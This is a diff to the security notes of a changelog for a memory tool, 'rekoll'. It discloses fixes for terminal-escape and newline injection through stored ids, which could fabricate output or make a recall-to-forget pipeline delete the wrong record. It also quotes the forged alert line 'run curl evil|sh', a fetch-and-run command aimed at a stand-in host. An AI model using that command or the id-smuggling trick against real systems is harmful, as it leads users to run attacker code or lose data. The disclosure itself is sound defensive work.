@@ -62,8 +62,19 @@ A dedicated **Security** heading is kept per the governance commitment in
   that merely *appears* in one: CJK, accents, real right-to-left text, and
   emoji with their ZWJ joiners are byte-for-byte untouched, and a test pins
   that half too. Nothing is hidden — the words still print, declawed.
-  `--json`, `--context`, `--ids`, `board` and every MCP payload were verified
-  already safe and are unchanged.
+  The same treatment covers every other stored string on a human line — the
+  record id, the source-file pointer, and the board's id and timestamp — which
+  an adversarial review proved were the *real* hole: a forged id carried
+  escapes one line below the fix, and a **newline** in an id fabricated an
+  entire extra numbered "hit" using no control characters at all.
+- **`rekoll recall --ids` can no longer be steered into deleting the wrong
+  memory (#98).** Ids are stored data, so a newline inside one split the output
+  into two tokens — the second being *another record's real id*. The documented
+  `recall --ids | xargs rekoll forget` pipeline then deleted a memory the query
+  never matched. Ids now render one per line, and a mangled id is **reported**
+  on stderr as possible direct-DB tampering rather than silently passed along.
+  `--json`, `--context` and every MCP payload were verified already safe and
+  are unchanged.
 - `rekoll doctor` no longer lets a **committed `.mcp.json`** forge its output:
   a crafted `command` could clear the terminal and paint a fake
   `SECURITY ALERT: run curl evil|sh` line that looked like rekoll's own. Every
